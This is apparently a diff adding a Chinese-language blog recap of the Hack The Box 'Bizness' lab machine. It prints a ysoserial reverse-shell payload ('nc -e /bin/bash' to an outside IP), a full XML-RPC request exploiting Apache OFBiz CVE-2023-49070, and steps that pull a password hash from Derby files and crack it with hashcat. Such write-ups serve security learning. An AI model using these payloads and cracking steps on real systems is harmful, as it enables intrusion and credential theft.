@@ -740,4 +740,56 @@
         <tag>复盘</tag>
       </tags>
   </entry>
+  <entry>
+    <title>htb bizness复盘</title>
+    <url>/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：easy</p>
+<p>IP：10.10.11.252</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描，扫到22 80 443 40081端口，先看80端口，需要配置hosts文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>然后访问网页，翻到最下面发现是apache ofbiz</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
+<p>查询到有相关漏洞，反序列化命令执行漏洞 CVE-2023-49070，在网上找到<a class="link"   href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>，按照poc使用</p>
+<p>先下载ysoserial.jar生成base64的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后发包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;生成的paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到第一个shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>涉及的知识点没见过，记录一下</strong></p>
+<p>通过搜索，找到&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0目录下有很多.dat文件，<strong>derby是个小型数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>(\w+\W+)&#123;0,5&#125;</code>：这是一个正则表达式，用于匹配最多五个字母&#x2F;数字和非字母&#x2F;数字字符的序列。<code>\w+</code> 匹配一个或多个字母&#x2F;数字字符，<code>\W+</code> 匹配一个或多个非字母&#x2F;数字字符，<code>&#123;0,5&#125;</code> 表示该序列最多重复匹配 0 到 5 次。</li>
+<li><code>password</code>：这是正则表达式中的一个具体词汇，表示要匹配的密码。</li>
+</ul>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
+<p>找到一串，Password&#x3D;”$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I” ，然后用cyberchef对后半段进行处理，解密成16进制的字符串</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
+<p>把_换成&#x2F;，把-换成+，再base64解码，最后转化到十六进制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>
+
+<p>使用hashid识别一下加密类型</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
+<p>猜测是120模式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>
+
+<p>爆出来的密码是monkeybizness</p>
+<p>然后直接su - root登录，权限就到root了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机最后提取拿密码的思路之前没见过，学习了，然后apache那个反序列化漏洞实践poc的过程很有趣，htb的靶机质量真的可以。</p>
+<p>涉及知识点：poc利用，sha1加盐爆破，信息搜集（敏感数据库泄露），grep正则提取。</p>
+<h4 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h4><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <tags>
+        <tag>复盘</tag>
+        <tag>htb</tag>
+      </tags>
+  </entry>
 </search>
